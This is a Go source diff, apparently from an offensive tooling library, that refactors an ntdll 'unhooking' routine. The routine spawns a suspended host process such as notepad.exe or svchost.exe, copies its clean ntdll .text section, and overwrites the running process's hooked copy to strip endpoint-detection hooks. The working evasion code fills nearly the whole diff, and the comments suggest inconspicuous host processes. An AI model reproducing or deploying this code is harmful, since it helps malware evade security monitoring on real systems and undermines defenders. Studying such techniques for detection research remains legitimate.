@@ -160,30 +160,40 @@ func FullUnhook(caller *wsyscall.Caller) error {
 }
 
 // PerunUnhook reads a pristine copy of ntdll.dll from a freshly spawned
-// suspended process (notepad.exe). The child process has a clean ntdll
-// because EDR hooks are typically applied after process initialization.
+// suspended process. The child process has a clean ntdll because EDR hooks
+// are typically applied after process initialization.
+// Spawns notepad.exe as the child process. Use PerunUnhookTarget to choose
+// a different host process.
+func PerunUnhook(caller *wsyscall.Caller) error {
+	return PerunUnhookTarget("notepad.exe", caller)
+}
+
+// PerunUnhookTarget is like PerunUnhook but spawns the specified process
+// instead of notepad.exe. Common alternatives: "svchost.exe", "calc.exe".
 //
 // Steps:
-//  1. Spawn notepad.exe in suspended state
+//  1. Spawn target in suspended state
 //  2. Read the ntdll.dll .text section from the child process memory
 //  3. Overwrite our hooked .text section with the clean copy
 //  4. Terminate the child process
-func PerunUnhook(caller *wsyscall.Caller) error {
-	// Spawn notepad.exe suspended
+func PerunUnhookTarget(target string, caller *wsyscall.Caller) error {
+	if target == "" {
+		target = "notepad.exe"
+	}
 	sysDir, _ := windows.GetSystemDirectory()
-	notepadPath, _ := windows.UTF16PtrFromString(filepath.Join(sysDir, "notepad.exe"))
+	targetPath, _ := windows.UTF16PtrFromString(filepath.Join(sysDir, target))
 
 	var si windows.StartupInfo
 	si.Cb = uint32(unsafe.Sizeof(si))
 	var pi windows.ProcessInformation
 
 	err := windows.CreateProcess(
-		notepadPath, nil, nil, nil, false,
+		targetPath, nil, nil, nil, false,
 		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
 		nil, nil, &si, &pi,
 	)
 	if err != nil {
-		return fmt.Errorf("CreateProcess notepad: %w", err)
+		return fmt.Errorf("CreateProcess %s: %w", target, err)
 	}
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
@@ -196,7 +206,11 @@ func PerunUnhook(caller *wsyscall.Caller) error {
 	}
 	localBase := uintptr(ntdllHandle)
 
-	// Parse local ntdll headers to find .text section location and size
+	// Parse local ntdll headers to find .text section location and size.
+	// Manual PE header walking is used here instead of debug/pe because we
+	// are reading the in-memory (loaded) image, not a file on disk. debug/pe
+	// expects file-layout sections, while loaded images use RVA-based layout.
+	// ClassicUnhook and FullUnhook use debug/pe because they read from disk.
 	dosHeader := (*[2]byte)(unsafe.Pointer(localBase))
 	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
 		return fmt.Errorf("invalid MZ header at ntdll base")
